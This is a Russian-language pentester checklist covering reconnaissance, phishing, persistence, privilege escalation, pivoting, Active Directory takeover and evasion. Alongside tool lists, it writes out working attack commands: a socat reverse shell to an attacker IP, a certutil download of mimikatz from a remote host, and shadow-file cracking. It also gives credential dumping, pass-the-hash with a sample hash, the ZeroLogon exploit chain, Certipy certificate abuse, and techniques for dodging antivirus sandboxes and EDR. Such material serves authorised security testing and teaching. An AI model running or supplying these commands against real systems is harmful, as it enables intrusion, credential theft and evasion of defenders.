# ЧЕКЛИСТ ПЕНТЕСТЕРА
## 1 Разведка
КАКУЮ ИНФОРМАЦИЮ ИСКАТЬ:
+ Обнаружение доменных имен, принадлежащих организации
+ Обнаружение “живых” хостов в сети и составления списка их IP-адресов
+ Определение актуального статуса сетевых портов узлов из списка
+ Определение типа и версии операционной системы на исследованных машинах
+ Определение версий ПО или служб, которые находятся на сетевых портах
+ Сбор информации об используемых технологиях на веб-сайте
### 1.1 Пассивная разведка (OSINT)
+ https://dnsdumpster.com/ - для сбора информации об инфраструктуре сети
+ https://crt.sh/ - база данных открытых SSL/TLS сертификатах
+ https://www.shodan.io/ - просто шодан.
+ https://search.censys.io/ - просто censys.
+ СПАРК - система, собирающая всю доступную информацию о компаниях. https://spark-interfax.ru/ 
+ RIPE - схожая ситуация с СПАРКом, только для зарубежных организаций. https://apps.db.ripe.net/db-web-ui/fulltextsearch
+ https://osintframework.com/ - полезные ресурсы для ОСИНТа
+ https://github.com/jivoi/awesome-osint - полезные ОСИНТ-статьи
### 1.2 Активная разведка
#### DNS
+ host - Резолв IP по DNS. `host <domain>`
+ Amass - Сбор информации об инфраструктуре. `amass enum -v -d <domain>`
+ whois - протокол поиска информации о зарегистрированных доменных именах, IP-адресах и автономных системах. `whois <domain>`
+ dnslookup - опрос доменной системы. `nslookup -q=ANY example.com ns.example.com` | Также можно воспользоваться AXFR запросом, который при неправильной конфигурации DNS-сервера просто сдампит базу данных с DNS-зоной. `nslookup -q=AXFR example.com`
+ subfinder - перебор саб-доменов. `subfinder -d <домен>`
+ https://pentest-tools.com/ - много пентест-тулзов, но платно. (Надо найти бесплатно)
#### Узлы
+ nmap - имба. Примеры - https://denisnovikov.github.io/blog/stunning-examples-of-nmap-commands/ 
  + `nmap -sn --traceroute <IP>`
    + `-sn` — ping-сканирование.
    + `--traceroute` — также для того, чтобы проводить трассировку маршрута до каждого найденного узла.
  + `-PS` — TCP-SYN сканирование.
  + `-PU` — UDP сканирование.
  + `-PE; -PP; -PM` — ICMP-сканирование других типов
  + Повышение <b>скорости</b> сканирования
    + `-sn` - не делать сканирование портов после обнаружения узла
    + `-n` - отключает DNS-резолвинг
    + `-T0/T1/T2/T3/T4/T5` - опции таймингов. 0 - самый медленный, 5 - шизовый
  + Повышение <b>незаметности</b> сканирования
    + `--data-length <length>` - добавляет случайных байтов информации к каждому пакету, что помогает сделать сканирование менее заметным
    + `--randomize-hosts` - добавляет опцию перемешивающую сканирование узлов, чтобы сделать сканирование менее подозрительным при анализе трафика
  + Для повышения <b>качества</b> сканирования можно пробовать использовать TCP/UDP подключение
+ zenmap - GUI для имбы
+ masscan - сканер сети, разработанный с целью увеличения скорости сканирования крупных сегментов сети, в т.ч. всего пространства адресов IPv4
  + `masscan 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12 -p80 --open-only`
    + `-D` - Для повышения скрытности можно реализовать возможность использования фиктивных хостов (decoys) с опцией -D для того, чтобы скрыть IP-адрес атакующего от IDS/IPS систем.
#### Порты
+ nmap
  + `nmap -sS <example.com>` - TCP-SYN сканирование узла
  + `nmap -sT <example.com>` - полное TCP сканирование узла
  + `nmap -sU <example.com>` - UDP сканирование узла
  + Повышение <b>скорости</b> сканирования портов
    + `-T0/T1/T2/T3/T4/T5` - опции таймингов. 0 - самый медленный, 5 - шизовый
    + `--top-ports <количество_портов>` - сканирует число из топ самых используемых портов
    + `-n` - отключает DNS-резолвинг
  + Повышение <b>скрытости</b> сканирования портов. <b>Только в локальных сетях</b>
    + `-spoof-mac` - для смены MAC-адреса
    + `-S` - для смены IP-адреса
  + Повышение <b>качества</b> сканирования портов
    + `-p-` - для сканирования всех портов
    + `-oN <имя_файла>` - для вывода инфы в файл
    + `-iL <имя_файла>` - для сканирования IP-адресов из файла
  + Комбинация
    + `sudo nmap --script <категории - скриптов>|<директория>|<имя_файла>|all <example.com>` Есть возможность использования скриптов
      + `—script-args <имя1>=<значение1>, <имя2>={<имя3>=<значение3>}, <имя4>=<значение4>` передача значений скриптам
    + `-sV` - позволяет узнать версию используемых служб
    + `-sL` - позволяет определить имя сетевогоь узла, сканирование которого и происходит
    + `-v` - выводит подробную информацию о результатах сканирования. Также -vv и -vvv
    + `-6` - позволит использовать при сканировании IPv6
    + `-Pn` - позволяет отключить проверки доступности узла с помощью ICMP пакетов, так как некоторые FireWall настроены на откидывание данных пакетов
    + Для хайпа
      + `-sN` - не устанавливает никакие биты флагов в TCP-заголовке
      + `-sF` - только FIN бит
      + `-sX` - устанавливаются FIN, PSH и URG флаги
      + `-sA` - данный тип сканирование направлен на изучение особенностей реагирования Firewall. Если порт не фильтруется, то будет возвращаться TCP ответ с флагом RST
      + `-sI` - данный метод сканирование позволяет полностью анонимно просканировать узел на информацию о состояние портов, так как сканирование происходит от лица другого узла
      + `-sW` - данный тип сканирование похож сутью работы на TCP ACK, но при этом способен определять, закрыт или открыт порт за счёт анализа поля TCP Window в RST ответе. В некоторых системах открытые порты используют положительное значение этого поля (даже в RST пакетах), а закрытые — нулевое
      + `-sM` - этот тип сканирования носит имя своего первооткрывателя, Уриела Мэймона. Техника практически такая же, как и при NULL, FIN и Xmas сканированиях, только в качестве запросов используются запросы FIN/ACK. Согласно RFC 793 (TCP), в ответ на такой запрос должен быть сгенерирован RST пакет, если порт открыт или закрыт. Однако многие BSD системы просто отбрасывают пакет, если порт открыт
## 2 Атаки первичного доступа
### 2.1 Эксплуатация уязвимостей приложений
https://github.com/OWASP/CheatSheetSeries/tree/master - имбовый гиточек от OWASP по созданию безопасных сайтов
https://github.com/swisskyrepo/PayloadsAllTheThings - имбовый гиточек с пейлоадами
+ Сбор всех возможных файлов/директорий/URLок по веб-сервису
  + ffuf - https://github.com/ffuf/ffuf 
  + WEBsPYder(имба) - https://github.com/zizzs3228/WEBsPYder
+ Поиск потенциальных точек входа
  + Админская панель
  + Место загрузки файлов
  + Место создания пользователей, аутентификации
  + Место пользовательского ввода
+ Поиск различных уязвимостей в точках входа
### 2.2 Экслпуатация уязвимостей в сетевых сервисах
+ Сканирование. `nmap -sT -Pn -n -F -sV --open <hostname>`
+ Исследование сервиса и нахождение версии ПО
+ Поиск эксплойтов, их анализ и эксплуатация
  + MetaSploit и их подобия
    + Metasploit Framework (Free): https://www.metasploit.com/ 
    + CobaltStrike ($$$): https://www.cobaltstrike.com/ 
    + Exploit Pack ($$$): http://exploitpack.com/ 
    + Core Impact Pro ($$$): https://www.coresecurity.com/products/core-impact
  + Гитхабчек и гугл
### 2.3 Социальная инженерия
https://github.com/giuliacassara/awesome-social-engineering - юсфулл статейки
+ Сбор информации об организации и потенциальных целях
  + Сбор информации об организации по OSINT
    + Сбор по поисковикам
    + https://spark-interfax.ru/ - СПАРК
    + https://www.rusprofile.ru/ - руспрофайл
    + https://hh.ru/ - хх.ру для сбора информации про структуру компании
    + hunter.io
    + snov.io
    + intelx.io
    + Отзывы о работодателях
      + https://www.glassdoor.com/ 
      + https://maps.yandex.ru/ 
      + https://pravda-sotrudnikov.ru/
  + Инструменты
    + Infoga - https://github.com/m4ll0k/Infoga 
    + FocaPro - https://github.com/ElevenPaths/FOCA 
    + TheHarvester - https://github.com/laramies/theHarvester
  + Техники
    + SMTP User Enumeration (RCPT TO, MAIL FROM, VRFY) - энумерация (перебор) пользователей почтового сервера через протокол SMTP
    + OWA (Outlook Web Access) Enumeration - энумерация (перебор) пользователей почтового сервера через веб-страницу Outlook Web Access.
+ Подготовка сценариев
  + Техники маскирования
    + [Маскирование доменов](https://github.com/elceef/dnstwist): формирование похожих доменов, отличающихся одной буквой, цифрой, разделением и пр. символами с целью создания домена, схожего с оригиналом
    + Подмена отправителя: техника формирования письма в соответствии со стандартами RFC 822, 5322 реализуется таким образом, чтобы влиять на заголовок письма From, создавая видимость отправки письмо от стороннего лица
    + Отправка без авторизации в рамках одного домена
    + [Evil Proxy](https://github.com/kgretzky/evilginx2) (Проброс трафика через прокси): использование прокси вместо поддельных сайтов для перехвата кодов второго фактора и идеального воспроизведения зеркала сайта
  + Применение инструментов автоматизации
    + [SET](https://github.com/trustedsec/social-engineer-toolkit) (Social Engineering Toolkit)
    + [GoPhish](https://getgophish.com/)
    + Metasploit Framework
+ Применение сценариев атак и измерение результатов
  + Время запуска:
    + ранние (утренние) часы
    + середина рабочей недели (среда / четверг): чтобы сотрудники могли продолжить “ловиться” и в пятницу
  + Что может пойти не так?
    + Блокировка вашего рассыльщика: нужно иметь в виду минимум 3 варианта mail-серверов, если вы хотите отправить порядка тысячи писем
    + Реагирование на ваш сценарий социальной инженерии
  + Что измерять как результат?
    + открытие писем
    + переходы по ссылкам
    + введенные данные
    + выполнение сценария: ответные действия и прочее...
+ Сбор E-mail адресов сотрудников 
  + [Email Permutator+](http://metricsparrow.com/toolkit/email-permutator/) – автоматически составляет список возможных адресов. Просто заполните поля формы и дождитесь, пока он составит список.
  + Для верификации можно воспользоваться этими сервисами:
    + https://tools.emailhippo.com/ 
    + https://www.verifyemailaddress.org/ 
    + https://verify-email.org/ 
    + https://verifalia.com/validate-email 
    + https://quickemailverification.com/ 
    + https://www.accuwebhosting.com/blog/top-10-bulk-email-list-verification-validation-services-compared/
  + Whois
    + https://whois.ru/ 
    + https://dnschecker.org/ip-whois-lookup.php 
    + https://bgp.he.net/
  + OSINT
    + Infoga – инструмент, собирающий информацию об учетных записях электронной почты (ip,имя хоста, страна,…) из различных открытых источников (поисковые системы, серверы ключей pgp и shodan) и проверяющий, не произошла ли утечка электронной почты с помощью haveibeenpwned.com API.
    + [Maltego](https://www.maltego.com/) – мощная программа для сбора информации из различных баз данных, а также их представления в удобном для понимания формате (строит логические связи между данными).
    + [LeakCheck](https://leakcheck.io/) – поиск данных среди >7.8 млрд записей включающие более 3000 баз данных. Поиск по имени, почте, ключевым словам, паролям или корпоративным доменным именам.
    + [h8mail](https://github.com/khast3x/h8mail) – представляет собой инструмент OSINT для поиска электронных почт и нарушений, использующие различные службы взлома и разведки, или локальные нарушения (например, Collection 1 Троя Ханта, торрент “Breach Compilation”).
    + [Hunter](https://hunter.io/) – позволяет за считанные секунды найти адреса электронных почт, информацию о том, на каких ресурсах они были опубликованы, и связаться с ними.
    + Зарубежный ресурс [Datanyze.com](http://www.datanyze.com/#) также помогает наводить справки, но подходит скорее для иностранных пользователей. В нем достаточно указать название компании, в которой работает искомый человек. После этого вы получите список электронных ящиков, российские компании он почти не знает.
    + Google Dorks
    + [pagodo](https://github.com/opsdisk/pagodo) – Passive Google Dork
    + [emailrep](http://emailrep.io/) — сайт найдет на каких сервисах был зарегистрирован аккаунт, использующий определенную почту.
    + [dehashed.com](http://dehashed.com/) — проверка почты в слитых базах.
    + DuckDuckGo «@domainname.com» → поиск
  + Тулзы
    + [hydra](https://en.kali.tools/?p=220) – это распараллеленный брутфорс паролей к различным сервисам (FTP, POP3, IMAP, Telnet, HTTP Auth, NNTP, VNC, ICQ, PCNFS, CISCO и др.) для UNIX платформ. С помощью этой утилиты вы можете атаковать несколько сервисов одновременно.
    + [theHarvester](https://github.com/laramies/theHarvester) – это простой в использовании, но мощный инструмент, предназначенный для использования на этапе разведки. Он выполняет сбор информации из открытых источников (OSINT), чтобы помочь определить уровень внешних угроз домена. Инструмент собирает имена, адреса электронной почты, IP-адреса, поддомены и URL-адреса с помощью несколько общедоступных ресурсов.
### 2.4 Экслпуатация уязвимостей в беспроводной сети
### 2.5 Переиспользование учётных данных сотрудников
## 3 Закрепление доступа
+ Получение легитимного доступа к системе
  + Извлечение паролей и ключей из доступных файлов в ОС
    + LinPeas
    + WinPeas
  + Восстановление паролей из хешей
    1. `sudo cp /etc/shadow /tmp/shadow`
    2. `sudo unshadow /etc/passwd /tmp/shadow > /tmp/unshadowed`
    3. `john /tmp/unshadowed`
    +  hashcat
  + Восстановление паролей и ключей из памяти процессов
    + Mimipenguin
    + truffleproc
    + 3snake – перехват паролей ssh, sudo и su (experimental)
    + SSHPry2.0 – перехват данных в терминале
    + Gimmecredz – дамп паролей в памяти (на основе bash)
+ Внесение изменений в легитимные механизмы доступа
  + Создание нового пользователя
  + Изменение учетных данных пользователя
  + Добавление ключей доступа
  + Сброс до стандартных паролей и учетных данных в сервисах
  + Открытие механизмов отладки в службах
+ Внесение изменений в сервисы и внешние программы в ОС
  + Внедрение бэкдоров в сервисы ОС
  + Внедрение уязвимого поведения в сервисы ОС, для последующей эксплуатации уязвимостей
  + Запуск внешних программ для получения последующего контроля
+ Внесение изменений в ядро ОС и в предустановленные службы на нем
  + RootKit
    + [TripleCross](https://github.com/h3xduck/TripleCross) - это Linux eBPF-руткит с открытым исходным кодом, который демонстрирует наступательные возможности технологии eBPF*.
  + Утилиты RAT (Remote Access Tool)
    + [pupy](https://github.com/n1nj4sec/pupy)
+ Внедрение бэкдоров модули аутентификации на основе PAM
  + https://github.com/ociredefz/pambd/
  + Внедрение бэкдоров в драйверы
  + Внедрение бекдоров в службы автозапуска (использование systemd)
## 4 Повышение привилегий
+ Тулзы для энумерации
  + linPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS 
    + `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` 
  + winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+ Топ частых кейсов для повышения привилегий
  + sudo
  + поиск паролей в .bash_history
  + cron
  + эксплуатация ядра
## 5 Выход за границы DMZ
+ Популярные способы выхода за рамки сети ДМЗ
  + Компрометация узлов внутри сети ДМЗ, имеющих доступ за рамки сети:
    + Веб-сервисы, чья БД находится в локальной сети компании
    + Почтовый сервер, который имеет доступ к домену через протоколы получения доступа к информации из домена
    + Терминальный сервер, предоставляющий доступы к файловым серверам и доменным службам
  + Компрометация сетевого оборудования и переконфигурация устройств и списков контроля доступа:
    + Компрометация оборудования Cisco, Juniper, MikroTik через известные уязвимости
    + Использование простых паролей или подбор паролей через доступные панели администрирования сетевого оборудования
    + Приведение к отказу в обслуживании сетевого оборудования для сброса настроек
  + Компрометация клиентов, входящих в DMZ сеть на управляемые узлы:
    + Эксплуатация уязвимостей SSH-агентов при подключении к скомпрометированному SSH-серверу
    + Эксплуатация уязвимостей браузеров при подключении клиента из локальной сети к скомпрометированному веб-приложению (уязвимости XSS, UXSS, CSRF, Browser RCE и пр.)
    + Кража учетных данных клиентов и администраторов на скомпрометированных узлах в ДМЗ и переиспользование их для попадания в локальную сеть
  + Обнаружение лазеек (отдельных сегментов / протоколов), которым предоставлен доступ за рамки сети ДМЗ:
    + Обнаружение MultiCast, AnyCast протоколов в трафике, которые могут быть использованы для проведения атак
    + Обнаружение доступных из ДМЗ сети логических сегментов локальной сети компании
    + Обнаружение протоколов (в т.ч. их стандартных портов), которым позволено выходить за рамки сети ДМЗ (DNS, LDAP, SSH, и пр.)
+ Цели:
  + Выявление уязвимых сервисов, которые приведут к компрометации новых узлов: SSH (22), FTP (21), SMB/RPC (135/445), MSSQL (1433), PostgreSQL (5432), Redis (6379), Web (80,443), Alternative Web (8080,8443), etc…
  + Выявление доступных маршрутов трафика до узлов во внутренней сети компании: сканирование собственной локальной сети (172.16.0.0/12 или 192.168.0.0/16), сканирование локальной сети организации 10.0.0.0/8
  + Обнаружение доступных сервисов сетевого оборудования: Cisco Smart Install (4786), Web (80,443), Cisco UCS Director Express for Big Data + VNC (8787/ 599), SSH (22), Mikrotik Neighbor Discovery Protocol (5678), Winbox (8291) и пр.
+ Команды для сканирования
  + `nmap -n -sn -T5 192.168.0.0/16` - сканирование узлов
  + `nmap -n -Pn -T5 --top-ports=1000 -sV -iL scope.txt` - сканирование портов на узлах
  + `nmap -Pn -n -sU -p53 -T5 10.0.0.0/8` (Сканирование может занимать вплоть до суток). Сканирует только 53 порт
  + `nmap -Pn -n -sS -p22 -T5 10.0.0.0/8` 
  + `nmap -sn -n -T5 --disable-arp-ping 10.0.0.0/8` 
+ Анализ трафика
  + tcpdump
    + `sudo tcpdump -i eth0 -nn -s0 -w test.pcap` 
      + `-i` - интерфейс для прослушивания
      + `-nn` - не резолвит имена хостов или портов
      + `-s0` - весь трафик
      + `-w` - название файла для захваченного трафика
  + wireshark
+ MiTM
  + ARP spoofing
    + [bettercap](https://www.bettercap.org/legacy/) - это мощный, легко расширяемый и переносимый фреймворк, написанный на языке Go. Он призван предложить исследователям безопасности, "красным командам" и реверс-инженерам простое в использовании, универсальное решение со всеми функциями, которые могут им понадобиться для проведения разведки и атак на сети WiFi, устройства Bluetooth Low Energy, беспроводные устройства HID и сети Ethernet.
      + `bettercap -T 10.10.10.10 -X` 
    + [bettarcap](https://github.com/bettercap/bettercap) - новая версия
  + MiTM 6
    + [ettercap](https://github.com/Ettercap/ettercap)
    + [bettercap](https://github.com/bettercap/bettercap)
    + [mitm6](https://github.com/dirkjanm/mitm6)
    + [yersinia](https://github.com/tomac/yersinia)
    + [scapy](https://github.com/secdev/scapy/)
## 6 Проброс портов для выхода из DMZ
#### Port2Port в Bash
+ Связывание портов локального сервера в Bash:
  + `mknod backpipe p;`
  + `nc -lvnp 443 0<backpipe | nc -lvnp 3333 1&>backpipe`
+ Связывание портов локального и удаленного серверов в Bash:
  1. `exec 3<>/dev/tcp/192.168.1.2/443` - создание файлового дескриптора №3 и связывание потоков ввода-вывода портом 443 внешнего узла 192.168.1.2
  2. `exec 4<>/dev/tcp/0.0.0.0/3333` - создание файлового дескриптора №4 и связывание потоков ввода-вывода портом 3333 самого узла (“Джамп сервера”)
  3. `cat <&3 &>&4 &` - передача в фоновом режиме данных потока ввода из файлового дескриптора №3 на поток вывода файлового дескриптора №4
  4. `cat <&4 &>&3 &` - передача в фоновом режиме данных потока ввода из файлового дескриптора №4 на поток вывода файлового дескриптора №3
#### Port2Port в SSH
+ Связывание портов локального сервера в SSH на удаленном узле:
  1. `ssh -R 0.0.0.0:10080:127.0.0.1:80 user@10.0.1.3` - при подключении к SSH на узле 10.0.1.3 откроется публичный порт 10080, который будет ссылаться на локальный порт 80 (который доступен только с самого узла)
+ Связывание портов локального и удаленного серверов в SSH на удаленном узле:
  1. `ssh -R 0.0.0.0:10033:10.0.2.5:1433 user@10.0.1.3` - при подключении к SSH на узле 10.0.1.3 откроется публичный порт 10033, который будет ссылаться на порт 1433 удаленного узла 10.0.2.5
+ Связывание собственного локального порта и удаленного узла за сервером с SSH:
  1. `ssh -L 10080:10.0.3.6:80 -N -f -l user@10.0.1.3` - при подключении к SSH на узел 10.0.1.3 на вашем локальном компьютере откроется порт 10080, который будет ссылаться на порт 80 адреса 10.0.3.6 узла стоящего в одной сети с узлом жертвой (10.0.1.3)​​
#### Использование метода Port2HostNet в SSH
+ `ssh -f -N -D 4444 user@10.0.0.1` 
  1. Устанавливается SSH-соединение с удаленным хостом по адресу 10.0.0.1, используя имя пользователя user
  2. Опция -f заставляет SSH-клиент запуститься в фоновом режиме
  3. Опция -N указывает на то, что SSH-клиент не должен выполнять какие-либо команды после подключения к удаленному хосту
  4. Опция -D 4444 создает SOCKS-прокси на локальной машине, который слушает порт 4444: все запросы на сетевые ресурсы будут перенаправляться через этот прокси на удаленный хост по зашифрованному каналу SSH (поддерживается Socks4 и Socks5) 
#### Внешние тулзы
+ Meterpreter
  + `meterpreter > portfwd add –l 3389 –p 3389 –r [target host]` -эта команда добавляет проброс порта (port forwarding) с локального порта 3389 на удаленный порт 3389 на целевом хосте [target host].
+ Socat
  + P2P форвардинг на “джамп” сервере:
    + `socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &`
  + Пример обратного шелла:
    + `attacker > socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0`
    + `victim > socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane`
+ GOST (GO Simple Tunnel)
  + Стандартный HTTP/SOCKS5 прокси:
    + `gost -L=:8080` 
  + Прокси с аутентификацией:
    + `gost -L=admin:123456@localhost:8080`
  + Прокси сервер:
    + `gost -L=socks://:1080`
  + Прокси клиент:
    + `gost -L=:8080 -F=socks://server_ip:1080`
#### DNS-туннелирование
+ Тулзы:
  + DNSCAT2 — инструмент, предназначенный для создания зашифрованного командно-контрольного канала (C&C) через протокол DNS, который является эффективным туннелем практически из любой сети
    + Запуск сервера:
      + `./dnscat2.rb our-domain-server.org`
    + Запуск клиента:
      + `./dnscat2 our-domain-server.org`
  + Iodine — программное обеспечение, позволяющее туннелировать данные IPv4 через сервер DNS сервер: это может быть полезно в различных ситуациях, когда доступ в интернет исключен, но DNS-запросы разрешены 
+ Пример проброса туннелирования трафика через DNS-туннель:
  + `listen 4444 10.0.1.3:80` — поднимет на стороне сервера порт 4444, который будет отправлять трафик на узел 10.0.1.3 на порт 80 на стороне агента
#### ICMP-туннелирование
+ Для запуска в качестве сервера (от имени root):
  + `./hans -s 10.1.2.0 -p password` — это создаст новое tun-устройство и назначит ему IP 10.1.2.1
+ Для запуска в качестве клиента (от имени root):
  + `./hans -c server_addess -p пароль` — это позволит подключиться к серверу по адресу "server_addess", создать новое tun-устройство и назначить ему IP из сети 10.1.2.0/24
## 7 Разведка локальной сети
#### Поиск Windows машин в локальной сети
+ nmap
  + `nmap -Pn -n -F -sT --open 192.168.10.0/24` 
  + `nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open 192.168.10.4` - с предопределённым портом
+ wireshark
  + `nbns || llmnr || mdns` - фильтр
#### Атаки на Windows машины
+ уязвимости
  + metasploit
+ брут-форс
  + Что может быть подвергнуто атаке в Windows:
    + SMB
    + MSSQL
    + LDAP
    + RDP
  + Атака через hydra
    + `hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V`
  + password-spraying - брут-форс одного пароля раз в один час
+ MiTM
  + [Responder](https://github.com/SpiderLabs/Responder) — это инструмент для выполнения атаки MiTM в отношении методов аутентификации в Windows. Эта программа использует отправление LLMNR, NBT-NS и MDNS, через которое перенаправляет трафик с запросами и хешами аутентификации на подконтрольный узел.
## 8 Повышение привилегий в Windows
+ Поиск секретов и паролей в ОС
  + `cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config` - поиск текста password в различных файлах
+ Энумерация
  + [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+ Получение учётных записей из оперативной памяти
  + Mimikatz
    + Для загрузки инструмента mimikatz необходимо перейти в папку с правами на запись, например в `C:\Windows\System32\spool\drivers\color`.
    + Далее следует загрузить mimikatz на целевую машину. Это можно сделать утилитой, позволяющей скачивать файл по сети certutil: `certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe`
    + После запуска Mimi нужно указать следующую команду, которая предоставит текущей учетной записи права отладки процессов (SeDebugPrivilege): `privilege::debug`
    + Следующая команда вернет список всех хранящихся на этой машине хешей и паролей в виде незашифрованного текста:`sekurlsa::logonPasswords`
+ Повышение привилегий через права на установку ПО (AlwaysInstallElevated):
  + Информация лежит в ключе регистра: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer и HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` 
  + Эксплуатируется через metasploit
+ Уязвимости для повышения привилегий
#### Горизонтальное повышение привилегий
+ Сбор хешей паролей 
  + meterpreter - `hashdump` 
+ Pass the Hash
  + Для осуществления атаки Pass the Hash в Windows 7 и выше с установленным обновлением KB2871997 требуются действительные учетные данные пользователя домена или хэши администратора (RID 500).
  + `psexec.py -hashes`
  + `aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc`
  + `example.local/Administrator@10.129.177.234 whoami`
  + Impacket — это набор классов Python для работы с сетевыми протоколами. Impacket ориентирован на предоставление низкоуровневого программного доступа к пакетам, а для некоторых протоколов (например, SMB1-3 и MSRPC) — к самой реализации протокола. Пакеты могут быть созданы с нуля, а также разобраны из необработанных данных, а объектно-ориентированный API упрощает работу с глубокими иерархиями протоколов. Библиотека предоставляет набор инструментов в качестве примеров того, что может быть сделано в контексте этой библиотеки.
  + Psexec.exe
  + Impacket
  + Atexec.py / at.exe
## 9 захват контроля над доменом
+ Эксплуатация уязвимостей
  + ZeroLogon
    1. Сброс пароля при помощи эксплойта: `python3 cve-2020-1472-exploit.py -n 'DC01$' -t 10.10.0.1` 
    2. Реализация атаки DCSync с пустым паролем: `python3 secretsdump.py -no-pass -just-dc 'domain.local/DC01$@10.10.0.1'` 
    3. Получаем NT-хеш администратора с “относительным идентификатором” (relative identifier) RID 500 и используем его для получения доступа к управлению контроллером через WMI с помощью утилиты пакета Impacket: wmiexec.py: `python3 wmiexec.py -hashes <hash-value> 'domain.local/DC01$@10.10.0.1'` 
    4. Создаем и скачиваем резервные копии реестра для восстановления пароля DC:
       1. `reg save HKLM\SYSTEM system.save`
       2. `reg save HKLM\SAM sam.save` 
       3. `reg save HKLM\SECURITY security.save` 
       4. `lget system.save` 
       5. `lget sam.save` 
       6. `lget security.save` 
       7. `del /f system.save` 
       8. `del /f sam.save` 
       9. `del /f security.save`
    5. Извлекаем пароль из извлеченных копий реестра: `python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL` 
    6. Получаем пароль машины контроллера домена в строке: `$MACHINE.ACC:plain_password_hex:b4d1....`
    7. И инсталлируем хеш машины обратно: `python3 reinstall_original_pw.py DC-01$ 10.10.0.1 b4d1….`
+ Кража учетных данных, токенов и сессий привилегированных УЗ
  + Administrators, Domain Admins, Enterprise Admins
  + Group Policy Creators Owners
  + Account Operators
  + Schema Admins
  + Event Log Readers
  + Backup Operators
  + Remote Management Users
  + Server Operators
  + DnsAdmins 
+ Эксплуатация миссконфигураций сервисов в AD
  + Пример:
    + Вы взломали Linux машины, имеющую доступ в домен (это значит, что у нее есть машинная учетная запись в домене, и она хранится где-то в файловой системе).
    + С высокой долей вероятности этот файл с названием *.ccache может лежать в папке /tmp/ или файл *.keytab в папке /etc
    + Используя обнаруженный файл доменной машинной учетной записи, вы можете использовать его для атаки PassTheTicket и обратиться к какому либо из сервисов AD.
    + Вы можете получить доступ в ActiveDirectory через протокол LDAP и узнать, какая машина отвечает за сервис AD CS (Active Directory Certificate Services) или же, получив доступ в Windows машине, в домене выполнить команду: certutil -config - -ping, для получения списка Certificate Authority.
    + Далее, в случае некорректной настройки AD CS, вы можете, используя утилиту Certipy, попробовать выпустить себе сертификат по шаблону, который разрешает через аутентификацию клиента получателю сертификата указать произвольное альтернативное имя субъекта (SAN).
    + Таким образом, вы сможете выпустить сертификат на имя администратора домена и воспользоваться им для получения доступа уровня администратора на контроллере домена.
  + Тулзы:
    + Certipy:
      + Запрос сертификата по шаблону создания сертификата для другого пользователя: `certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1-Test -upn administrator@corp.local -dns dc.corp.local` 
      + Запрос TGT и получение NT хеша с использованием полученного ранее сертификата: `certipy auth -pfx administrator_dc.pfx -dc-ip 172.16.126.128`
## 10 Сокрытие в сети
+ Использование шифрованных каналов связи
  + Это могут быть такие протоколы, как:
    + HTTPS
    + SMB (только версии 3.1.1 и выше)
    + SMTP (только на порте 465 с использованием команды STARTTLS)
    + SSH
  + Пейлоады, которые шифруются по дефолту
    + `windows/meterpreter/reverse_https`
    + `windows/meterpreter/reverse_winhttps`
    + `windows/meterpreter_reverse_https`
+ Использование скриптовых пейлоадов и подготовливать их
  + Способы обхода статического анализа нагрузок:
    + **Шифрование.** Если вы шифруете двоичный файл, EPP не сможет обнаружить вашу программу, но вам понадобится какой-то загрузчик для расшифровки и запуска программы в памяти.
    + **Обфускация.** Иногда достаточно изменить некоторые строки в бинарном файле или скрипте, чтобы он прошел мимо EPP, но это может занять много времени, в зависимости от того, что именно вы пытаетесь замаскировать.
    + **Самописный инструментарий.** Если вы разработаете собственные инструменты, то в них не будет известных сигнатур зловредного ПО.
  + Рассмотрим ряд действенных приемов, которые могут быть применены для обхода детектирования динамическим анализатором:
    + **Сон перед выполнением.** Средствами защиты выделяется достаточно мало времени на анализ файлов, чтобы не прерывать рабочий процесс пользователя, поэтому использование длительного сна может нарушить анализ двоичных файлов. Проблема в том, что многие антивирусные песочницы могут просто пропустить функцию сна в зависимости от того, как она реализована.
    + **Проверка ресурсов машины.** Обычно песочницы имеют очень мало ресурсов для работы (например, < 2 ГБ RAM), иначе они могут замедлить работу машины пользователя. В проверке ресурсов возможно проявить творческий подход, например, проверять температуру процессора или даже скорость вращения куллера, движение пользовательской мыши - не все из возможных проверок будет реализовано в песочнице.
    + **Проверки для конкретной машины.** Если вы хотите нацелиться на пользователя, чья рабочая станция подключена к домену "domain.local", вы можете выполнить проверку домена компьютера на соответствие указанному вами домену, и, если домен не соответствует вашей цели, вы можете заставить вашу программу не переходить в активный режим.
  + Бесфайловое исполнение
  + Инструменты генерации нагрузок для обхода EPP и EDR:
    + [Veil](https://github.com/Veil-Framework/Veil) — это инструмент, предназначенный для создания нагрузок metasploit, которые обходят обычные антивирусные решения.
    + [Freeze](https://github.com/optiv/Freeze) — это инструмент создания полезной нагрузки, используемый для обхода средств контроля безопасности EDR с целью скрытного выполнения шеллкода. Freeze использует множество методов не только для удаления Userland EDR хуки, но и для выполнения шеллкода таким образом, чтобы обойти другие средства контроля конечных точек.
    + [SGN](https://github.com/EgeBalci/sgn) — это полиморфный двоичный кодер, предназначенный для наступательных целей безопасности, таких, как генерация статически недетектируемых двоичных полезных нагрузок. Он использует аддитивный цикл обратной связи для кодирования заданных двоичных инструкций, подобно LFSR. 
+ Снижение активности в сети
  + Шаги для снижения активности в сети:
    + Исключить все возможные типы сканирования портов, т.к. этот процесс достаточно легко детектируется даже через сканирование портов на одном узле.
    + Перед обращением к какому-либо узлу сети продумывать, не попадем ли мы в HoneyPot, и почему выбранный нами узел — точно не HoneyPot.
    + Исключить совершение атак типа “Man in The Middle”.
